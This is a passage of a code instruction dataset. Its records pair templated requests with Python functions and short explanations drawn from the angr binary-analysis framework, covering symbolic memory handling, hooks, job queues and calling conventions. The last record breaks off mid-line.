{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nstores the data in the native memory.", "response": "def _store_in_native_memory(self, data, data_type, addr=None):\n        \"\"\"\n        Store in native memory.\n\n        :param data:      Either a single value or a list.\n                          Lists get interpreted as an array.\n        :param data_type: Java type of the element(s).\n        :param addr:      Native store address.\n                          If not set, native memory is allocated.\n        :return:          Native addr of the stored data.\n        \"\"\"\n        # check if addr is symbolic\n        if addr is not None and self.state.solver.symbolic(addr):\n            raise NotImplementedError('Symbolic addresses are not supported.')\n        # lookup native size of the type\n        type_size = ArchSoot.sizeof[data_type]\n        native_memory_endness = self.state.arch.memory_endness\n        # store single value\n        if isinstance(data, int):\n            if addr is None:\n                addr = self._allocate_native_memory(size=type_size//8)\n            value = self.state.solver.BVV(data, type_size)\n            self.state.memory.store(addr, value, endness=native_memory_endness)\n        # store array\n        elif isinstance(data, list):\n            if addr is None:\n                addr = self._allocate_native_memory(size=type_size*len(data)//8)\n            for idx, value in enumerate(data):\n                memory_addr = addr+idx*type_size//8\n                self.state.memory.store(memory_addr, value, endness=native_memory_endness)\n        # return native addr\n        return addr"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nloading the elements from native memory.", "response": "def _load_from_native_memory(self, addr, data_type=None, data_size=None,\n                                no_of_elements=1, return_as_list=False):\n        \"\"\"\n        Load from native memory.\n\n        :param addr:            Native load address.\n        :param data_type:       Java type of elements.\n                                If set, all loaded elements are casted to this type.\n        :param data_size:       Size of each element.\n                                If not set, size is determined based on the given type.\n        :param no_of_elements:  Number of elements to load.\n        :param return_as_list:  Whether to wrap a single element in a list.\n        :return:                The value or a list of loaded element(s).\n        \"\"\"\n        # check if addr is symbolic\n        if addr is not None and self.state.solver.symbolic(addr):\n            raise NotImplementedError('Symbolic addresses are not supported.')\n        # if data size is not set, derive it from the type\n        if not data_size:\n            if data_type:\n                data_size = ArchSoot.sizeof[data_type]//8\n            else:\n                raise ValueError(\"Cannot determine the data size w/o a type.\")\n        native_memory_endness = self.state.arch.memory_endness\n        # load elements\n        values = []\n        for i in range(no_of_elements):\n            value = self.state.memory.load(addr + i*data_size,\n                                          size=data_size,\n                                          endness=native_memory_endness)\n            if data_type:\n                value = self.state.project.simos.cast_primitive(self.state, value=value, to_type=data_type)\n            values.append(value)\n        # return element(s)\n        if no_of_elements == 1 and not return_as_list:\n            return values[0]\n        else:\n            return values"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nloads a string from native memory.", "response": "def _load_string_from_native_memory(self, addr_):\n        \"\"\"\n        Load zero terminated UTF-8 string from native memory.\n\n        :param addr_: Native load address.\n        :return:      Loaded string.\n        \"\"\"\n        # check if addr is symbolic\n        if self.state.solver.symbolic(addr_):\n            l.error(\"Loading strings from symbolic addresses is not implemented. \"\n                    \"Continue execution with an empty string.\")\n            return \"\"\n        addr = self.state.solver.eval(addr_)\n\n        # load chars one by one\n        chars = []\n        for i in itertools.count():\n            str_byte = self.state.memory.load(addr+i, size=1)\n            if self.state.solver.symbolic(str_byte):\n                l.error(\"Loading of strings with symbolic chars is not supported. \"\n                        \"Character %d is concretized.\", i)\n            str_byte = self.state.solver.eval(str_byte)\n            if str_byte == 0:\n                break\n            chars.append(chr(str_byte))\n\n        return \"\".join(chars)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nstore given string in native memory.", "response": "def _store_string_in_native_memory(self, string, addr=None):\n        \"\"\"\n        Store given string UTF-8 encoded and zero terminated in native memory.\n\n        :param str string:  String\n        :param addr:        Native store address.\n                            If not set, native memory is allocated.\n        :return:            Native address of the string.\n        \"\"\"\n        if addr is None:\n            addr = self._allocate_native_memory(size=len(string)+1)\n        else:\n            # check if addr is symbolic\n            if self.state.solver.symbolic(addr):\n                l.error(\"Storing strings at symbolic addresses is not implemented. \"\n                        \"Continue execution with concretized address.\")\n            addr = self.state.solver.eval(addr)\n\n        # warn if string is symbolic\n        if self.state.solver.symbolic(string):\n            l.warning('Support for symbolic strings, passed to native code, is limited. '\n                      'String will get concretized after `ReleaseStringUTFChars` is called.')\n\n        # store chars one by one\n        str_len = len(string) // 8\n        for idx in range(str_len):\n            str_byte = StrSubstr(idx, 1, string)\n            self.state.memory.store(addr+idx, str_byte)\n\n        # store terminating zero\n        self.state.memory.store(len(string), BVV(0, 8))\n\n        return addr"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngiving the target object and a set of hooks apply them to the target object.", "response": "def install_hooks(target, **hooks):\n        \"\"\"\n        Given the target `target`, apply the hooks given as keyword arguments to it.\n        If any targeted method has already been hooked, the hooks will not be overridden but will instead be pushed\n        into a list of pending hooks. The final behavior should be that all hooks call each other in a nested stack.\n\n        :param target:  Any object. Its methods named as keys in `hooks` will be replaced by `HookedMethod` objects.\n        :param hooks:   Any keywords will be interpreted as hooks to apply. Each method named will hooked with the\n                        coresponding function value.\n        \"\"\"\n        for name, hook in hooks.items():\n            func = getattr(target, name)\n            if not isinstance(func, HookedMethod):\n                func = HookedMethod(func)\n                setattr(target, name, func)\n            func.pending.append(hook)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef remove_hooks(target, **hooks):\n        for name, hook in hooks.items():\n            hooked = getattr(target, name)\n            if hook in hooked.pending:\n                try:\n                    hooked.pending.remove(hook)\n                except ValueError as e:\n                    raise ValueError(\"%s is not hooked by %s\" % (target, hook)) from e\n            if not hooked.pending:\n                setattr(target, name, hooked.func)", "response": "Removes the given hooks from the given target object."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef reset(self):\n\n        self._sorted_nodes.clear()\n        self._node_to_index.clear()\n        self._reached_fixedpoint.clear()\n\n        for i, n in enumerate(self.sort_nodes()):\n            self._node_to_index[n] = i\n            self._sorted_nodes.add(n)", "response": "Reset the internal node traversal state."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning all successors to the given node.", "response": "def all_successors(self, node, skip_reached_fixedpoint=False):\n        \"\"\"\n        Returns all successors to the specific node.\n\n        :param node: A node in the graph.\n        :return:     A set of nodes that are all successors to the given node.\n        :rtype:      set\n        \"\"\"\n\n        successors = set()\n\n        stack = [ node ]\n        while stack:\n            n = stack.pop()\n            successors.add(n)\n            stack.extend(succ for succ in self.successors(n) if\n                         succ not in successors and\n                            (not skip_reached_fixedpoint or succ not in self._reached_fixedpoint)\n                         )\n\n        return successors"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nrevisiting a node in the future.", "response": "def revisit(self, node, include_self=True):\n        \"\"\"\n        Revisit a node in the future. As a result, the successors to this node will be revisited as well.\n\n        :param node: The node to revisit in the future.\n        :return:     None\n        \"\"\"\n\n        successors = self.successors(node) #, skip_reached_fixedpoint=True)\n\n        if include_self:\n            self._sorted_nodes.add(node)\n\n        for succ in successors:\n            self._sorted_nodes.add(succ)\n\n        # reorder it\n        self._sorted_nodes = OrderedSet(sorted(self._sorted_nodes, key=lambda n: self._node_to_index[n]))"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nadding a new job to the job list.", "response": "def add_job(self, job, merged=False, widened=False):\n        \"\"\"\n        Appended a new job to this JobInfo node.\n        :param job: The new job to append.\n        :param bool merged: Whether it is a merged job or not.\n        :param bool widened: Whether it is a widened job or not.\n        \"\"\"\n\n        job_type = ''\n        if merged:\n            job_type = 'merged'\n        elif widened:\n            job_type = 'widened'\n        self.jobs.append((job, job_type))"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nchecks whether there exists another job with the same key.", "response": "def has_job(self, job):\n        \"\"\"\n        Checks whether there exists another job which has the same job key.\n        :param job: The job to check.\n\n        :return:    True if there exists another job with the same key, False otherwise.\n        \"\"\"\n        job_key = self._job_key(job)\n        return job_key in self._job_map"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nanalyzes the current base graph and returns None.", "response": "def _analyze(self):\n        \"\"\"\n        The main analysis routine.\n\n        :return: None\n        \"\"\"\n\n        self._pre_analysis()\n\n        if self._graph_visitor is None:\n            # There is no base graph that we can rely on. The analysis itself should generate successors for the\n            # current job.\n            # An example is the CFG recovery.\n\n            self._analysis_core_baremetal()\n\n        else:\n            # We have a base graph to follow. Just handle the current job.\n\n            self._analysis_core_graph()\n\n        self._post_analysis()"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _add_input_state(self, node, input_state):\n\n        successors = self._graph_visitor.successors(node)\n\n        for succ in successors:\n            if succ in self._state_map:\n                self._state_map[succ] = self._merge_states(succ, *([ self._state_map[succ], input_state ]))\n            else:\n                self._state_map[succ] = input_state", "response": "Adds the input state to all successors of the given node."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nget the input abstract state for this node and remove it from the state map.", "response": "def _pop_input_state(self, node):\n        \"\"\"\n        Get the input abstract state for this node, and remove it from the state map.\n\n        :param node: The node in graph.\n        :return:     A merged state, or None if there is no input state for this node available.\n        \"\"\"\n\n        if node in self._state_map:\n            return self._state_map.pop(node)\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _merge_state_from_predecessors(self, node):\n\n        preds = self._graph_visitor.predecessors(node)\n\n        states = [ self._state_map[n] for n in preds if n in self._state_map ]\n\n        if not states:\n            return None\n\n        return reduce(lambda s0, s1: self._merge_states(node, s0, s1), states[1:], states[0])", "response": "Get abstract states for all predecessors of the node and merge them and return the merged state."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _process_job_and_get_successors(self, job_info):\n\n        job = job_info.job\n\n        successors = self._get_successors(job)\n\n        all_new_jobs = [ ]\n\n        for successor in successors:\n            new_jobs = self._handle_successor(job, successor, successors)\n\n            if new_jobs:\n                all_new_jobs.extend(new_jobs)\n\n                for new_job in new_jobs:\n                    self._insert_job(new_job)\n\n        self._post_job_handling(job, all_new_jobs, successors)", "response": "Process a job and get all successors of this job and call _handle_successor on each successor."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _insert_job(self, job):\n\n        key = self._job_key(job)\n\n        if self._allow_merging:\n            if key in self._job_map:\n                job_info = self._job_map[key]\n\n                # decide if we want to trigger a widening\n                # if not, we'll simply do the merge\n                # TODO: save all previous jobs for the sake of widening\n                job_added = False\n                if self._allow_widening and self._should_widen_jobs(job_info.job, job):\n                    try:\n                        widened_job = self._widen_jobs(job_info.job, job)\n                        # remove the old job since now we have a widened one\n                        if job_info in self._job_info_queue:\n                            self._job_info_queue.remove(job_info)\n                        job_info.add_job(widened_job, widened=True)\n                        job_added = True\n                    except AngrJobWideningFailureNotice:\n                        # widening failed\n                        # fall back to merging...\n                        pass\n\n                if not job_added:\n                    try:\n                        merged_job = self._merge_jobs(job_info.job, job)\n                        # remove the old job since now we have a merged one\n                        if job_info in self._job_info_queue:\n                            self._job_info_queue.remove(job_info)\n                        job_info.add_job(merged_job, merged=True)\n                    except AngrJobMergingFailureNotice:\n                        # merging failed\n                        job_info = JobInfo(key, job)\n                        # update the job map\n                        self._job_map[key] = job_info\n\n            else:\n                job_info = JobInfo(key, job)\n                self._job_map[key] = job_info\n\n        else:\n            job_info = JobInfo(key, job)\n            self._job_map[key] = job_info\n\n        if self._order_jobs:\n            self._binary_insert(self._job_info_queue, job_info, lambda elem: self._job_sorting_key(elem.job))\n\n        else:\n            self._job_info_queue.append(job_info)", "response": "Insert a new job into the job queue."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _peek_job(self, pos):\n\n        if pos < len(self._job_info_queue):\n            return self._job_info_queue[pos].job\n\n        raise IndexError()", "response": "Return the job currently at the given position."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _binary_insert(lst, elem, key, lo=0, hi=None):\n\n        if lo < 0:\n            raise ValueError(\"lo must be a non-negative number\")\n\n        if hi is None:\n            hi = len(lst)\n\n        while lo < hi:\n            mid = (lo + hi) // 2\n            if key(lst[mid]) < key(elem):\n                lo = mid + 1\n            else:\n                hi = mid\n\n        lst.insert(lo, elem)", "response": "Insert an element into a sorted list and keep the list sorted."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nmerges this SimMemory with the others SimMemory.", "response": "def merge(self, others, merge_conditions, common_ancestor=None): # pylint: disable=unused-argument\n        \"\"\"\n        Merge this SimMemory with the other SimMemory\n        \"\"\"\n\n        changed_bytes = self._changes_to_merge(others)\n\n        l.info(\"Merging %d bytes\", len(changed_bytes))\n        l.info(\"... %s has changed bytes %s\", self.id, changed_bytes)\n\n        self.read_strategies = self._merge_strategies(self.read_strategies, *[\n            o.read_strategies for o in others\n        ])\n        self.write_strategies = self._merge_strategies(self.write_strategies, *[\n            o.write_strategies for o in others\n        ])\n        merged_bytes = self._merge(others, changed_bytes, merge_conditions=merge_conditions)\n\n        return len(merged_bytes) > 0"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nmaking a symbolic variable of length bytes starting at addr.", "response": "def make_symbolic(self, name, addr, length=None):\n        \"\"\"\n        Replaces `length` bytes starting at `addr` with a symbolic variable named name. Adds a constraint equaling that\n        symbolic variable to the value previously at `addr`, and returns the variable.\n        \"\"\"\n        l.debug(\"making %s bytes symbolic\", length)\n\n        if isinstance(addr, str):\n            addr, length = self.state.arch.registers[addr]\n        else:\n            if length is None:\n                raise Exception(\"Unspecified length!\")\n\n        r = self.load(addr, length)\n\n        v = self.get_unconstrained_bytes(name, r.size())\n        self.store(addr, v)\n        self.state.add_constraints(r == v)\n        l.debug(\"... eq constraints: %s\", r == v)\n        return v"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _apply_concretization_strategies(self, addr, strategies, action):\n\n        # we try all the strategies in order\n        for s in strategies:\n            # first, we trigger the SimInspect breakpoint and give it a chance to intervene\n            e = addr\n            self.state._inspect(\n                'address_concretization', BP_BEFORE, address_concretization_strategy=s,\n                address_concretization_action=action, address_concretization_memory=self,\n                address_concretization_expr=e, address_concretization_add_constraints=True\n            )\n            s = self.state._inspect_getattr('address_concretization_strategy', s)\n            e = self.state._inspect_getattr('address_concretization_expr', addr)\n\n            # if the breakpoint None'd out the strategy, we skip it\n            if s is None:\n                continue\n\n            # let's try to apply it!\n            try:\n                a = s.concretize(self, e)\n            except SimUnsatError:\n                a = None\n\n            # trigger the AFTER breakpoint and give it a chance to intervene\n            self.state._inspect(\n                'address_concretization', BP_AFTER,\n                address_concretization_result=a\n            )\n            a = self.state._inspect_getattr('address_concretization_result', a)\n\n            # return the result if not None!\n            if a is not None:\n                return a\n\n        # well, we tried\n        raise SimMemoryAddressError(\n            \"Unable to concretize address for %s with the provided strategies.\" % action\n        )", "response": "Applies concretization strategies on the address until one of them succeeds."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef concretize_write_addr(self, addr, strategies=None):\n\n        if isinstance(addr, int):\n            return [ addr ]\n        elif not self.state.solver.symbolic(addr):\n            return [ self.state.solver.eval(addr) ]\n\n        strategies = self.write_strategies if strategies is None else strategies\n        return self._apply_concretization_strategies(addr, strategies, 'store')", "response": "Concretizes an address meant for writing."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef dbg_print(self, indent=0):\n        lst = []\n        more_data = False\n        for i, addr in enumerate(self.mem.keys()):\n            lst.append(addr)\n            if i >= 20:\n                more_data = True\n                break\n\n        for addr in sorted(lst):\n            data = self.mem[addr]\n            if isinstance(data, SimMemoryObject):\n                memobj = data\n                print(\"%s%xh: (%s)[%d]\" % (\" \" * indent, addr, memobj, addr - memobj.base))\n            else:\n                print(\"%s%xh: <default data>\" % (\" \" * indent, addr))\n        if more_data:\n            print(\"%s...\" % (\" \" * indent))", "response": "Print out debugging information."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nretrieving the permissions of the page at the given address.", "response": "def permissions(self, addr, permissions=None):\n        \"\"\"\n        Retrieve the permissions of the page at address `addr`.\n\n        :param addr:        address to get the page permissions\n        :param permissions: Integer or BVV to optionally set page permissions to\n        :return:            AST representing the permissions on the page\n        \"\"\"\n        out = self.mem.permissions(addr, permissions)\n        # if unicorn is in play and we've marked a page writable, it must be uncached\n        if permissions is not None and self.state.solver.is_true(permissions & 2 == 2):\n            if self.state.has_plugin('unicorn'):\n                self.state.unicorn.uncache_page(addr)\n        return out"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nmap a number of pages at address addr with permissions permissions.", "response": "def map_region(self, addr, length, permissions, init_zero=False):\n        \"\"\"\n        Map a number of pages at address `addr` with permissions `permissions`.\n        :param addr: address to map the pages at\n        :param length: length in bytes of region to map, will be rounded upwards to the page size\n        :param permissions: AST of permissions to map, will be a bitvalue representing flags\n        :param init_zero: Initialize page with zeros\n        \"\"\"\n        l.info(\"Mapping [%#x, %#x] as %s\", addr, addr + length - 1, permissions)\n        return self.mem.map_region(addr, length, permissions, init_zero=init_zero)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef successors(self, *args, **kwargs):\n\n        return self.project.engines.successors(*args, **kwargs)", "response": "Return a SimSuccessors object that represents the results of the current execution using any applicable engine."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn a state object initialized to the start of a given function, as if it were called with given parameters. :param addr: The address the state should start at instead of the entry point. :param args: Any additional positional arguments will be used as arguments to the function call. The following parametrs are optional. :param base_state: Use this SimState as the base for the new state instead of a blank state. :param cc: Optionally provide a SimCC object to use a specific calling convention. :param ret_addr: Use this address as the function's return target. :param stack_base: An optional pointer to use as the top of the stack, circa the function entry point :param alloc_base: An optional pointer to use as the place to put excess argument data :param grow_like_stack: When allocating data at alloc_base, whether to allocate at decreasing addresses :param toc: The address of the table of contents for ppc64 :param initial_prefix: If this is provided, all symbolic registers will hold symbolic values with names prefixed by this string. :param fs: A dictionary of file names with associated preset SimFile objects. :param concrete_fs: bool describing whether the host filesystem should be consulted when opening files. :param chroot: A path to use as a fake root directory, Behaves similarly to a real chroot. Used only when concrete_fs is set to True. :param kwargs: Any additional keyword args will be passed to the SimState constructor. :return: The state at the beginning of the function. :rtype: SimState The idea here is that you can provide almost any kind of python type in `args` and it'll be translated to a binary format to be placed into simulated memory. Lists (representing arrays) must be entirely elements of the same type and size, while tuples (representing structs) can be elements of any type and size. If you'd like there to be a pointer to a given value, wrap the value in a `SimCC.PointerWrapper`. Any value that can't fit in a register will be automatically put in a PointerWrapper. If stack_base is not provided, the current stack pointer will be used, and it will be updated. If alloc_base is not provided, the current stack pointer will be used, and it will be updated. You might not like the results if you provide stack_base but not alloc_base. grow_like_stack controls the behavior of allocating data at alloc_base. When data from args needs to be wrapped in a pointer, the pointer needs to point somewhere, so that data is dumped into memory at alloc_base. If you set alloc_base to point to somewhere other than the stack, set grow_like_stack to False so that sequencial allocations happen at increasing addresses.", "response": "def call_state(self, addr, *args, **kwargs):\n        \"\"\"\n        Returns a state object initialized to the start of a given function, as if it were called with given parameters.\n\n        :param addr:            The address the state should start at instead of the entry point.\n        :param args:            Any additional positional arguments will be used as arguments to the function call.\n\n        The following parametrs are optional.\n\n        :param base_state:      Use this SimState as the base for the new state instead of a blank state.\n        :param cc:              Optionally provide a SimCC object to use a specific calling convention.\n        :param ret_addr:        Use this address as the function's return target.\n        :param stack_base:      An optional pointer to use as the top of the stack, circa the function entry point\n        :param alloc_base:      An optional pointer to use as the place to put excess argument data\n        :param grow_like_stack: When allocating data at alloc_base, whether to allocate at decreasing addresses\n        :param toc:             The address of the table of contents for ppc64\n        :param initial_prefix:  If this is provided, all symbolic registers will hold symbolic values with names\n                                prefixed by this string.\n        :param fs:              A dictionary of file names with associated preset SimFile objects.\n        :param concrete_fs:     bool describing whether the host filesystem should be consulted when opening files.\n        :param chroot:          A path to use as a fake root directory, Behaves similarly to a real chroot. Used only\n                                when concrete_fs is set to True.\n        :param kwargs:          Any additional keyword args will be passed to the SimState constructor.\n        :return:                The state at the beginning of the function.\n        :rtype:                 SimState\n\n        The idea here is that you can provide almost any kind of python type in `args` and it'll be translated to a\n        binary format to be placed into simulated memory. Lists (representing arrays) must be entirely elements of the\n        same type and size, while tuples (representing structs) can be elements of any type and size.\n        If you'd like there to be a pointer to a given value, wrap the value in a `SimCC.PointerWrapper`. Any value\n        that can't fit in a register will be automatically put in a\n        PointerWrapper.\n\n        If stack_base is not provided, the current stack pointer will be used, and it will be updated.\n        If alloc_base is not provided, the current stack pointer will be used, and it will be updated.\n        You might not like the results if you provide stack_base but not alloc_base.\n\n        grow_like_stack controls the behavior of allocating data at alloc_base. When data from args needs to be wrapped\n        in a pointer, the pointer needs to point somewhere, so that data is dumped into memory at alloc_base. If you\n        set alloc_base to point to somewhere other than the stack, set grow_like_stack to False so that sequencial\n        allocations happen at increasing addresses.\n        \"\"\"\n        return self.project.simos.state_call(addr, *args, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn a new SimulationManager object initialized with the given thing.", "response": "def simulation_manager(self, thing=None, **kwargs):\n        \"\"\"\n        Constructs a new simulation manager.\n\n        :param thing:           Optional - What to put in the new SimulationManager's active stash (either a SimState or a list of SimStates).\n        :param kwargs:          Any additional keyword arguments will be passed to the SimulationManager constructor\n        :returns:               The new SimulationManager\n        :rtype:                 angr.sim_manager.SimulationManager\n\n        Many different types can be passed to this method:\n\n        * If nothing is passed in, the SimulationManager is seeded with a state initialized for the program\n          entry point, i.e. :meth:`entry_state()`.\n        * If a :class:`SimState` is passed in, the SimulationManager is seeded with that state.\n        * If a list is passed in, the list must contain only SimStates and the whole list will be used to seed the SimulationManager.\n        \"\"\"\n        if thing is None:\n            thing = [ self.entry_state() ]\n        elif isinstance(thing, (list, tuple)):\n            if any(not isinstance(val, SimState) for val in thing):\n                raise AngrError(\"Bad type to initialize SimulationManager\")\n        elif isinstance(thing, SimState):\n            thing = [ thing ]\n        else:\n            raise AngrError(\"BadType to initialze SimulationManager: %s\" % repr(thing))\n\n        return SimulationManager(self.project, active_states=thing, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns a Callable object that can be used as a interface for executing a virtual machine code like a native python function.", "response": "def callable(self, addr, concrete_only=False, perform_merge=True, base_state=None, toc=None, cc=None):\n        \"\"\"\n        A Callable is a representation of a function in the binary that can be interacted with like a native python\n        function.\n\n        :param addr:            The address of the function to use\n        :param concrete_only:   Throw an exception if the execution splits into multiple states\n        :param perform_merge:   Merge all result states into one at the end (only relevant if concrete_only=False)\n        :param base_state:      The state from which to do these runs\n        :param toc:             The address of the table of contents for ppc64\n        :param cc:              The SimCC to use for a calling convention\n        :returns:               A Callable object that can be used as a interface for executing guest code like a\n                                python function.\n        :rtype:                 angr.callable.Callable\n        \"\"\"\n        return Callable(self.project,\n                        addr=addr,\n                        concrete_only=concrete_only,\n                        perform_merge=perform_merge,\n                        base_state=base_state,\n                        toc=toc,\n                        cc=cc)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning a SimCC object parametrized for this project and optionally a given function.", "response": "def cc(self, args=None, ret_val=None, sp_delta=None, func_ty=None):\n        \"\"\"\n        Return a SimCC (calling convention) parametrized for this project and, optionally, a given function.\n\n        :param args:        A list of argument storage locations, as SimFunctionArguments.\n        :param ret_val:     The return value storage location, as a SimFunctionArgument.\n        :param sp_delta:    Does this even matter??\n        :param func_ty:     The prototype for the given function, as a SimType or a C-style function declaration that\n                            can be parsed into a SimTypeFunction instance.\n\n        Example func_ty strings:\n        >>> \"int func(char*, int)\"\n        >>> \"int f(int, int, int*);\"\n        Function names are ignored.\n\n        Relevant subclasses of SimFunctionArgument are SimRegArg and SimStackArg, and shortcuts to them can be found on\n        this `cc` object.\n\n        For stack arguments, offsets are relative to the stack pointer on function entry.\n        \"\"\"\n\n        return self._default_cc(arch=self.project.arch,\n                                  args=args,\n                                  ret_val=ret_val,\n                                  sp_delta=sp_delta,\n                                  func_ty=func_ty)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn a SimCC instance that will extract the arguments of the function.", "response": "def cc_from_arg_kinds(self, fp_args, ret_fp=None, sizes=None, sp_delta=None, func_ty=None):\n        \"\"\"\n        Get a SimCC (calling convention) that will extract floating-point/integral args correctly.\n\n        :param arch:        The Archinfo arch for this CC\n        :param fp_args:     A list, with one entry for each argument the function can take. True if the argument is fp,\n                            false if it is integral.\n        :param ret_fp:      True if the return value for the function is fp.\n        :param sizes:       Optional: A list, with one entry for each argument the function can take. Each entry is the\n                            size of the corresponding argument in bytes.\n        :param sp_delta:    The amount the stack pointer changes over the course of this function - CURRENTLY UNUSED\n        :param func_ty:     A SimType for the function itself or a C-style function declaration that can be parsed into\n                            a SimTypeFunction instance.\n\n        Example func_ty strings:\n        >>> \"int func(char*, int)\"\n        >>> \"int f(int, int, int*);\"\n        Function names are ignored.\n\n        \"\"\"\n        return self._default_cc.from_arg_kinds(arch=self.project.arch,\n                fp_args=fp_args,\n                ret_fp=ret_fp,\n                sizes=sizes,\n                sp_delta=sp_delta,\n                func_ty=func_ty)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef operations(self):\n        return [op for block in self.blocks for op in block.vex.operations]", "response": "Returns a list of all of the operations done by this functions."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef string_references(self, minimum_length=2, vex_only=False):\n        strings = []\n        memory = self._project.loader.memory\n\n        # get known instruction addresses and call targets\n        # these addresses cannot be string references, but show up frequently in the runtime values\n        known_executable_addresses = set()\n        for block in self.blocks:\n            known_executable_addresses.update(block.instruction_addrs)\n        for function in self._function_manager.values():\n            known_executable_addresses.update(set(x.addr for x in function.graph.nodes()))\n\n        # loop over all local runtime values and check if the value points to a printable string\n        for addr in self.local_runtime_values if not vex_only else self.code_constants:\n            if not isinstance(addr, claripy.fp.FPV) and addr in memory:\n                # check that the address isn't an pointing to known executable code\n                # and that it isn't an indirect pointer to known executable code\n                try:\n                    possible_pointer = memory.unpack_word(addr)\n                    if addr not in known_executable_addresses and possible_pointer not in known_executable_addresses:\n                        # build string\n                        stn = \"\"\n                        offset = 0\n                        current_char = chr(memory[addr + offset])\n                        while current_char in string.printable:\n                            stn += current_char\n                            offset += 1\n                            current_char = chr(memory[addr + offset])\n\n                        # check that the string was a null terminated string with minimum length\n                        if current_char == \"\\x00\" and len(stn) >= minimum_length:\n                            strings.append((addr, stn))\n                except KeyError:\n                    pass\n        return strings", "response": "Return a list of tuples of address and string that are used by this function."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ntries to find all runtime values of this function which do not come from inputs.", "response": "def local_runtime_values(self):\n        \"\"\"\n        Tries to find all runtime values of this function which do not come from inputs.\n        These values are generated by starting from a blank state and reanalyzing the basic blocks once each.\n        Function calls are skipped, and back edges are never taken so these values are often unreliable,\n        This function is good at finding simple constant addresses which the function will use or calculate.\n\n        :return: a set of constants\n        \"\"\"\n        constants = set()\n\n        if not self._project.loader.main_object.contains_addr(self.addr):\n            return constants\n\n        # FIXME the old way was better for architectures like mips, but we need the initial irsb\n        # reanalyze function with a new initial state (use persistent registers)\n        # initial_state = self._function_manager._cfg.get_any_irsb(self.addr).initial_state\n        # fresh_state = self._project.factory.blank_state(mode=\"fastpath\")\n        # for reg in initial_state.arch.persistent_regs + ['ip']:\n        #     fresh_state.registers.store(reg, initial_state.registers.load(reg))\n\n        # reanalyze function with a new initial state\n        fresh_state = self._project.factory.blank_state(mode=\"fastpath\")\n        fresh_state.regs.ip = self.addr\n\n        graph_addrs = set(x.addr for x in self.graph.nodes() if isinstance(x, BlockNode))\n\n        # process the nodes in a breadth-first order keeping track of which nodes have already been analyzed\n        analyzed = set()\n        q = [fresh_state]\n        analyzed.add(fresh_state.solver.eval(fresh_state.ip))\n        while len(q) > 0:\n            state = q.pop()\n            # make sure its in this function\n            if state.solver.eval(state.ip) not in graph_addrs:\n                continue\n            # don't trace into simprocedures\n            if self._project.is_hooked(state.solver.eval(state.ip)):\n                continue\n            # don't trace outside of the binary\n            if not self._project.loader.main_object.contains_addr(state.solver.eval(state.ip)):\n                continue\n            # don't trace unreachable blocks\n            if state.history.jumpkind in {'Ijk_EmWarn', 'Ijk_NoDecode',\n                                          'Ijk_MapFail', 'Ijk_NoRedir',\n                                          'Ijk_SigTRAP', 'Ijk_SigSEGV',\n                                          'Ijk_ClientReq'}:\n                continue\n\n            curr_ip = state.solver.eval(state.ip)\n\n            # get runtime values from logs of successors\n            successors = self._project.factory.successors(state)\n            for succ in successors.flat_successors + successors.unsat_successors:\n                for a in succ.history.recent_actions:\n                    for ao in a.all_objects:\n                        if not isinstance(ao.ast, claripy.ast.Base):\n                            constants.add(ao.ast)\n                        elif not ao.ast.symbolic:\n                            constants.add(succ.solver.eval(ao.ast))\n\n                # add successors to the queue to analyze\n                if not succ.solver.symbolic(succ.ip):\n                    succ_ip = succ.solver.eval(succ.ip)\n                    if succ_ip in self and succ_ip not in analyzed:\n                        analyzed.add(succ_ip)\n                        q.insert(0, succ)\n\n            # force jumps to missing successors\n            # (this is a slightly hacky way to force it to explore all the nodes in the function)\n            node = self.get_node(curr_ip)\n            if node is None:\n                # the node does not exist. maybe it's not a block node.\n                continue\n            missing = set(x.addr for x in list(self.graph.successors(node))) - analyzed\n            for succ_addr in missing:\n                l.info(\"Forcing jump to missing successor: %#x\", succ_addr)\n                if succ_addr not in analyzed:\n                    all_successors = successors.unconstrained_successors + \\\n           